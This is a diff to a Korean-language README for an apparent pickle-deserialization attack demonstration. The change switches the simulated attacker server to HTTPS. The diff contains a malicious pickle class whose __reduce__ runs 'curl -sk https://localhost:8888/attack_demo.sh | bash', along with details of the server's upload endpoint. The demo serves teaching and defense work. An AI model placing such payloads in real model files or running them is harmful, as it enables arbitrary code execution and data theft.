@@ -191,10 +191,10 @@ python3 -u 0_server.py 2>&1 | tee data/serverlog.txt
 
 # 출력:
 # ======================================================================
-#  Attack Demonstration Server
+#  Attack Demonstration Server (HTTPS)
 # ======================================================================
-# Server running on http://localhost:8888
-# Attack script: http://localhost:8888/attack_demo.sh
+# Server running on https://localhost:8888
+# Attack script: https://localhost:8888/attack_demo.sh
 ```
 
 #### Step 1: 악성 모델 생성 (터미널 2)
@@ -284,14 +284,16 @@ python3 5_defense_analysis.py
 **목적**: 공격자의 원격 서버 시뮬레이션
 
 **기능**:
-- HTTP 서버 (포트 8888)
+- HTTPS 서버 (포트 8888)
 - `attack_demo.sh` 스크립트 제공
 - 공격 성공 로그 기록
 - 파일 업로드 엔드포인트 (`POST /upload`)
+- SSL/TLS 암호화 통신
 
 **기술적 세부사항**:
 - `http.server.HTTPServer` 사용
 - `BaseHTTPRequestHandler` 커스텀 핸들러
+- SSL/TLS 암호화 (자체 서명 인증서)
 - 타임스탬프가 포함된 로그 기록
 
 **실행 방법**:
@@ -306,12 +308,14 @@ python3 -u 0_server.py 2>&1 | tee data/serverlog.txt
 **출력 예시**:
 ```
 ======================================================================
- Attack Demonstration Server
+ Attack Demonstration Server (HTTPS)
 ======================================================================
-Server running on http://localhost:8888
-Attack script: http://localhost:8888/attack_demo.sh
-Upload endpoint: POST to http://localhost:8888/upload
+Server running on https://localhost:8888
+Attack script: https://localhost:8888/attack_demo.sh
+Upload endpoint: POST to https://localhost:8888/upload
 Upload directory: /home/user/about-pickle_internal/uploads
+SSL Certificate: server.crt
+SSL Key: server.key
 ======================================================================
 
 [2025-12-30 11:27:46] [Attack Succeed] Attack script downloaded from 127.0.0.1
@@ -334,7 +338,7 @@ Upload directory: /home/user/about-pickle_internal/uploads
 class MaliciousPayload:
     def __reduce__(self):
         import os
-        return (os.system, ('curl -s http://localhost:8888/attack_demo.sh | bash',))
+        return (os.system, ('curl -sk https://localhost:8888/attack_demo.sh | bash',))
 ```
 
 **`__reduce__()` 메서드**:
